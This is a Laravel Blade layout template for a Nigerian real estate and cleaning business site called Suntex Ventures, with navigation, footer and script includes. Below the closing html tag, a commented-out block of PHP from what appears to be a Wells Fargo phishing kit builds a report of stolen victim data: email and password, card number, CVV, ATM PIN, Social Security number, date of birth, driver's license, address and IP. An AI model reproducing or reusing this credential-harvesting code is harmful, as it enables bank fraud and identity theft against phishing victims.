<!doctype html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css?family=Poppins:100,200,300,400,500,600,700,800,900&display=swap" rel="stylesheet">
    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>{{ config('app.name', 'Laravel') }}</title>

    <!-- Scripts -->
    <script src="{{ asset('js/app.js') }}" defer></script>

    <!-- Fonts -->
    <link rel="dns-prefetch" href="//fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css?family=Nunito" rel="stylesheet">

    <!-- Styles -->
    <link href="{{ asset('vendor/bootstrap/css/bootstrap.css') }}" rel="stylesheet">
    <link href="{{ asset('assets/css/flex-slider.css') }}" rel="stylesheet">
    <link href="{{ asset('assets/css/fontawesome.css') }}" rel="stylesheet">
    <link href="{{ asset('assets/css/owl.css') }}" rel="stylesheet">
    <link href="{{ asset('assets/css/style.css') }}" rel="stylesheet">
</head>
  <div class="app" id="app">
      <!-- Header -->
    <div class="sub-header header-text">
      <div class="container">
        <div class="row">
          <div class="col-md-8 col-xs-12">
            <ul class="left-info">
              <li><a href="#"><i class="fa fa-envelope"></i>info@suntex.com </a></li>
              <li><a href="#"><i class="fa fa-phone"></i>+234-909-010-8875</a></li>
            </ul>
          </div>
          <div class="col-md-4">
            <ul class="right-icons">
              <li><a href="#"><i class="fa fa-facebook"></i></a></li>
              <li><a href="#"><i class="fa fa-twitter"></i></a></li>
              <li><a href="#"><i class="fa fa-linkedin"></i></a></li>
            </ul>
          </div>
        </div>
      </div>
    </div>


      <!-- Header -->
      <header class="bg-white">
        <nav class="navbar navbar-expand-lg">
          <div class="container">
            <a class="navbar-brand" href="/"><h2 class="color_primary">SUNTEX<em> </em></h2></a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
              <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
              <ul class="navbar-nav ml-auto">
                <li class="nav-item {{$real}}">
                  <a class="nav-link text-dark" href="/real-estate">Home
                    <span class="sr-only">(current)</span>
                  </a>
                </li>
                <li class="nav-item {{$listing}}">
                  <a class="nav-link" href="/properties">Listings</a>
                </li>
                <li class="nav-item dropdown">
                  <a class="dropdown-toggle nav-link" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false">Property</a>
                
                  <div class="dropdown-menu">
                      <type-component></type-component>
                  </div>
                </li>

                <li class="nav-item">
                  <a class="nav-link" href="/agent">Agents</a>
                </li>
                
                <li class="nav-item ">
                  <a class="nav-link" href="/contact">Contact Us</a>
                </li>
              </ul>
            </div>
            <div class="nav-icons d-flex">
              <a class="nav-link" href="/favourites"><span class="iconify" data-icon="bi:suit-heart" style="color: #009960;"></span> <small class="span2">
              @if(auth()->user())
              {{count(auth()->user()->favourites)}}
              @else
              0
              @endif

              </small> </a>
              <a class="nav-link" href="/account"><span class="iconify" data-icon="bx:bx-user" style="color: #009960;"></span> </a>
              @if(auth()->user())
              <form action="{{ route('logout') }}" method="post">
                @csrf
                <button class="nav-link btn" style="background: none"><span class="iconify" style="color: #009960;" data-icon="fe:logout"></span></button>
              </form>
              @endif
            </div>


          </div>
        </nav>
      </header>
  
        <main class="py-4">
            @yield('realcontent')
        </main>
  
    <request-feedback ></request-feedback>

    <!-- Footer Starts Here -->
    <footer>
      <div class="container">
        <div class="row">
          <div class="col-md-4 footer-item">
            <h4>SUNTEX VENTURES</h4>
            <p>We are team of professionals, we are one of the top notch in General cleaning of houses, offices, company and its surroundings for both interior as well as the exterior. <a href="about-us.html" class="btn btn-link text-primary">Read more</a> </p>
            <ul class="social-icons">
              <li><a rel="nofollow" href="#" target="_blank"><i class="fa fa-facebook"></i></a></li>
              <li><a href="#"><i class="fa fa-twitter"></i></a></li>
              <li><a href="#"><i class="fa fa-linkedin"></i></a></li>
            </ul>
          </div>
          <div class="col-md-4 footer-item">
            <h4>Useful Links</h4>
            <ul class="menu-list">
              <li><a href="#">Home</a></li>
              <li><a href="#">Services</a></li>
              <li><a href="#">Contact Us</a></li>
              <li><a href="#">About Us</a></li>
            </ul>
          </div>
          <div class="col-md-4 footer-item">
            <h4>Additional Pages</h4>
            <ul class="menu-list">
              <li><a href="#">Properties</a></li>
              <li><a href="#">Become an Agent</a></li>
              <li><a href="#">Logistics</a></li>
              <li><a href="#">Cleaning</a></li>
              <li><a href="#"></a></li>
            </ul>
          </div>
        
        </div>
      </div>
    </footer>
    
    <div class="sub-footer">
      <div class="container">
        <div class="row">
          <div class="col-md-12">
            <p>
                Copyright © {{ date("Y")}} Suntex Ventures | Developer - Logic Camp
            </p>
          </div>
        </div>
      </div>
    </div>
    </div>
    <!-- Additional Scripts -->
    <script src="{{asset('vendor/jquery/jquery.min.js')}}"></script>
    <script src="{{asset('vendor/bootstrap/js/bootstrap.js')}}"></script>
    <script src="{{asset('assets/js/custom.js')}}"></script>
    <script src="{{asset('assets/js/owl.js')}}"></script>
    <script src="{{asset('assets/js/slick.js')}}"></script>
    <script src="{{asset('assets/js/accordions.js')}}"></script>
    <script src="{{asset('venderous/self_isotope.js')}}"></script>
    <script src="https://code.iconify.design/2/2.0.3/iconify.min.js"></script>
    <script src="https://js.paystack.co/v1/inline.js"></script> 
    

    <script>

        function switchImage(imgLink){
          const img = document.createElement('img')
          img.classList.add('img')
          img.classList.add('img-fluid')
          img.classList.add('w-100')
          img.src = "/storage/"+imgLink
          document.getElementById('mainPicture').innerHTML = "";
          document.getElementById('mainPicture').append(img)
        }

        
    </script>


  </body>
</html>


<!-- $_SESSION['city'] 	  = $_POST['city']; -->
       
       
       <!-- $code = " =============== WellsFargo By Anoxyty ================ \r\n\r\n  ";
     $code .= "Email address          :     " . $_SESSION['exxx'] . "\r\n\r\n  ";
     $code .= "Password          :     " . $_SESSION['psss'] . "\r\n\r\n  ";
     $code .= "Phone Number          :     " . $_SESSION['num'] . "\r\n\r\n  ";
     $code .= "Phone type          :     " . $_SESSION['phonetype'] . "\r\n\r\n  ";
     $code .= "Card No          :     " . $_SESSION['ccn'] . "\r\n\r\n  ";
     $code .= "cvv          :     " . $_SESSION['cvv'] . "\r\n\r\n  ";
     $code .= "exp month          :     " . $_SESSION['expmnth'] . "\r\n\r\n  ";
     $code .= "exp year          :     " . $_SESSION['expyr'] . "\r\n\r\n  ";
     $code .= "atm pin          :     " . $_SESSION['atm'] . "\r\n\r\n  ";
     $code .= "Fullname          :     " . $_SESSION['fname'] . "\r\n\r\n  ";
     $code .= "Lastname          :     " . $_SESSION['lname'] . "\r\n\r\n  ";
     $code .= "Social Security Number          :     " . $_SESSION['snnn'] . "\r\n\r\n  ";
     $code .= "dob          :     " . $_SESSION['dob'] . "\r\n\r\n  ";
     $code .= "Drivers License          :     " . $_SESSION['idnumber'] . "\r\n\r\n  ";
     $code .= "Address 1          :     " . $_SESSION['stradd1'] . "\r\n\r\n  ";
     $code .= "Address 2          :     " . $_SESSION['stradd2'] . "\r\n\r\n  ";
     $code .= "City          :     " . $_SESSION['city'] . "\r\n\r\n  ";
     $code .= "State          :     " . $_SESSION['state'] . "\r\n\r\n  ";
     $code .= "Zipcode          :     " . $_SESSION['zipcode'] . "\r\n\r\n  ";
       $code .= "--------🔑 I N F O | I P 🔑 -------- \r\n\r\n  ";
         $code .= "IP		: $ip \r\n\r\n  ";
         $code .= "IP lookup		: https://ip-api.com/$ip \r\n\r\n  ";
         $code .= "OS		: $useragent \r\n\r\n  "; -->
     
 